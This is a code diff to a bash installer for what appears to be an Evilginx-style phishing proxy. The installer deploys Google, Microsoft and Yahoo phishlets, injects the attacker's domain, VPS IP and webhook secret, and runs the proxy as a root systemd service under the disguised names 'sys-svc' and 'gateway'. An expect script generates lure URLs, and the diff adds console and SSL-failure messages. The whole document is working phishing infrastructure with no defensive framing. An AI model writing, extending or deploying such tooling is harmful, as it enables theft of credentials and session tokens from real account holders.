@@ -252,7 +252,7 @@ phase_build() {
         error "Build failed - sys-svc binary not found in $(pwd)"
     fi
 
-    mkdir -p "$APP_DIR"/{config,resources,certs,storage,logs,notifications}
+    mkdir -p "$APP_DIR"/{config,phishlets,certs,storage,logs,notifications}
     cp sys-svc /usr/local/bin/sys-svc
     chmod +x /usr/local/bin/sys-svc
     
@@ -275,18 +275,18 @@ phase_deploy_resources() {
     echo "$EP3" > "$APP_DIR/.ep3"
     
     # Copy from local editable resources
-    cp "$SCRIPT_DIR/phishlets/google.yaml" "$APP_DIR/resources/"
-    cp "$SCRIPT_DIR/phishlets/microsoft.yaml" "$APP_DIR/resources/"
-    cp "$SCRIPT_DIR/phishlets/yahoo.yaml" "$APP_DIR/resources/"
+    cp "$SCRIPT_DIR/phishlets/google.yaml" "$APP_DIR/phishlets/"
+    cp "$SCRIPT_DIR/phishlets/microsoft.yaml" "$APP_DIR/phishlets/"
+    cp "$SCRIPT_DIR/phishlets/yahoo.yaml" "$APP_DIR/phishlets/"
     
     # Enhanced sed to match .EndpointX naming and inject secrets
-    sed -i "s/{{.Domain}}/$DOMAIN/g" "$APP_DIR/resources/"*.yaml
-    sed -i "s/{{.Endpoint1}}/$EP1/g" "$APP_DIR/resources/"*.yaml
-    sed -i "s/{{.Endpoint2}}/$EP2/g" "$APP_DIR/resources/"*.yaml
-    sed -i "s/{{.Endpoint3}}/$EP3/g" "$APP_DIR/resources/"*.yaml
-    sed -i "s/{{.VpsIp}}/$VPS_IP/g" "$APP_DIR/resources/"*.yaml
-    sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" "$APP_DIR/resources/"*.yaml
-    sed -i "s/{{.AppPort}}/$HTTP_PORT/g" "$APP_DIR/resources/"*.yaml
+    sed -i "s/{{.Domain}}/$DOMAIN/g" "$APP_DIR/phishlets/"*.yaml
+    sed -i "s/{{.Endpoint1}}/$EP1/g" "$APP_DIR/phishlets/"*.yaml
+    sed -i "s/{{.Endpoint2}}/$EP2/g" "$APP_DIR/phishlets/"*.yaml
+    sed -i "s/{{.Endpoint3}}/$EP3/g" "$APP_DIR/phishlets/"*.yaml
+    sed -i "s/{{.VpsIp}}/$VPS_IP/g" "$APP_DIR/phishlets/"*.yaml
+    sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" "$APP_DIR/phishlets/"*.yaml
+    sed -i "s/{{.AppPort}}/$HTTP_PORT/g" "$APP_DIR/phishlets/"*.yaml
     
     success "Resources deployed"
     log "  Endpoint 1: $EP1.$DOMAIN"
@@ -308,7 +308,7 @@ https_port: $HTTPS_PORT # Will be 0 if SSL failed
 unauth_url: $UNAUTH_URL
 dns_port: 0
 autocert: false
-phishlets_path: $APP_DIR/resources
+phishlets_path: $APP_DIR/phishlets
 cert_path: $APP_DIR/certs
 database: $APP_DIR/storage/data.db
 EOF
@@ -459,7 +459,7 @@ After=network.target
 Type=simple
 User=root
 WorkingDirectory=$APP_DIR
-ExecStart=/usr/local/bin/sys-svc -c $APP_DIR/config -p $APP_DIR/resources
+ExecStart=/usr/local/bin/sys-svc -c $APP_DIR/config -p $APP_DIR/phishlets
 Restart=always
 RestartSec=5
 NoNewPrivileges=true
@@ -492,7 +492,7 @@ phase_generate_urls() {
 #!/usr/bin/expect -f
 set timeout 30
 log_user 0
-spawn /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/resources
+spawn /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets
 
 expect "gateway>" { send "config domain $env(DOMAIN)\r" }
 expect "gateway>" { send "config ipv4 external $env(VPS_IP)\r" }
@@ -572,17 +572,22 @@ print_summary() {
     echo -e "  ${GREEN}Yahoo:${NC}     $Y_URL"
     echo -e "  ${GREEN}Microsoft:${NC}  $M_URL"
     echo -e "  ${GREEN}Google:${NC}     $G_URL"
+    if [[ "$HTTPS_PORT" -eq 0 ]]; then
+        echo -e "${YELLOW}[!] WARNING: SSL certificate failed to obtain. Running in HTTP mode.${NC}"
+    fi
     echo ""
     echo -e "${CYAN}🔧 MANAGEMENT COMMANDS:${NC}"
     echo -e "  Status:     systemctl status gateway"
     echo -e "  Logs:       journalctl -u gateway -f"
     echo -e "  Restart:    systemctl restart gateway"
     echo -e "  Stop:       systemctl stop gateway"
+    echo -e "  Console:    sudo /usr/local/bin/sys-svc -c $APP_DIR/config -p $APP_DIR/phishlets"
+    echo -e "              (Use 'exit' to quit the console without stopping the service)"
     echo ""
     echo -e "${CYAN}📁 EDIT RESOURCES (if needed):${NC}"
-    echo -e "  nano $APP_DIR/resources/google.yaml"
-    echo -e "  nano $APP_DIR/resources/microsoft.yaml"
-    echo -e "  nano $APP_DIR/resources/yahoo.yaml"
+    echo -e "  nano $APP_DIR/phishlets/google.yaml"
+    echo -e "  nano $APP_DIR/phishlets/microsoft.yaml"
+    echo -e "  nano $APP_DIR/phishlets/yahoo.yaml"
     echo -e "  Then: systemctl restart gateway"
     echo ""
     if [[ -n "$NOTIFY_TOKEN" ]]; then
